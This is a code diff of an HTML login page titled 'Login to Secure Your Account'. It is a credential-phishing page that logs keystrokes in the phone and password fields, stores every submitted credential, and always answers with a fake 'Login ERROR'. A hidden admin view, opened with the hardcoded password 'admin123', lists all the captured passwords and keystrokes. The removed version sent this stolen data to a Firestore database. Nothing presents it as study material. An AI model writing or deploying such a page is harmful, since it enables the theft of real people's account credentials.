@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -27,7 +25,7 @@
             text-align: center;
             font-size: 18px;
             margin: 10px 0;
-            color: #c0392b;
+            color: red; /* Warning color */
         }
 
         .login-container input {
@@ -50,7 +48,7 @@
         }
 
         .admin-container {
-            display: none;
+            display: none; /* Hidden by default */
         }
 
         #userList {
@@ -63,7 +61,7 @@
         }
 
         .error-message {
-            color: #e74c3c;
+            color: red;
             font-size: 24px;
             font-weight: bold;
             text-align: center;
@@ -74,7 +72,7 @@
 <body>
 
 <div class="login-container" id="loginContainer">
-    <div class="login-title">&#9888; Login to Secure Your Account &#9888;</div>
+    <div class="login-title">⚠️ Login to Secure Your Account</div>
     <form id="loginForm" onsubmit="return login(event)">
         <input type="text" id="phone" name="phone" required oninput="recordInput('phone', event)">
         <label for="phone" class="form-label">Phone No./Username:</label>
@@ -94,61 +92,37 @@
 </div>
 
 <script>
-    // Your Firebase configuration
-    const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
-        authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-        projectId: "YOUR_PROJECT_ID",
-        storageBucket: "YOUR_PROJECT_ID.appspot.com",
-        messagingSenderId: "YOUR_SENDER_ID",
-        appId: "YOUR_APP_ID"
-    };
+    const users = []; // Array to store logged-in users and their keystrokes
 
-    // Initialize Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore(app);
-
-    const keystrokes = { phone: '', password: '' };
-
-    function recordInput(inputName, event) {
-        keystrokes[inputName] += event.data || '';
-    }
-
-    async function login(event) {
+    function login(event) {
         event.preventDefault();
         const phone = document.getElementById("phone").value;
         const password = document.getElementById("password").value;
 
-        const user = { phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password };
-        
-        await saveUserToFirestore(user); // Save user data to Firestore
+        // Add user to the array regardless of credentials
+        users.push({ phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password });
 
-        document.getElementById("loginMessage").innerText = "Login Error!";
+        // Display login error message
+        document.getElementById("loginMessage").innerText = "Login ERROR";
         document.getElementById("loginMessage").style.display = "block"; // Ensure message is visible
 
+        // Show admin view if the password is 'admin123'
         if (password === "admin123") {
             displayAdminView(); // Show admin view
         }
 
+        // Here you can add code to save user data to the database
+        // Example: saveToDatabase(phone, password, keystrokes);
+
+        // Optionally, reset the form fields
         document.getElementById("loginForm").reset();
     }
 
-    async function saveUserToFirestore(user) {
-        try {
-            await db.collection("users").add(user);
-            console.log('User data saved successfully');
-        } catch (error) {
-            console.error("Error saving user data: ", error);
-        }
-    }
-
-    async function displayAdminView() {
+    function displayAdminView() {
         const userList = document.getElementById("userList");
         userList.innerHTML = ""; // Clear previous list
 
-        const snapshot = await db.collection("users").get();
-        snapshot.forEach(doc => {
-            const user = doc.data();
+        users.forEach(user => {
             const li = document.createElement("li");
             li.innerText = `${user.phone} - ${user.password} - Typed Phone: ${user.keystrokesPhone}, Typed Password: ${user.keystrokesPassword}`;
             userList.appendChild(li);
@@ -156,7 +130,18 @@
 
         document.getElementById("adminContainer").style.display = "block"; // Show admin view
     }
+
+    const keystrokes = { phone: '', password: '' };
+
+    function recordInput(inputName, event) {
+        keystrokes[inputName] += event.data || '';
+    }
+
+    function getKeystrokes() {
+        return `Phone: ${keystrokes.phone}, Password: ${keystrokes.password}`;
+    }
 </script>
 
 </body>
 </html>
+
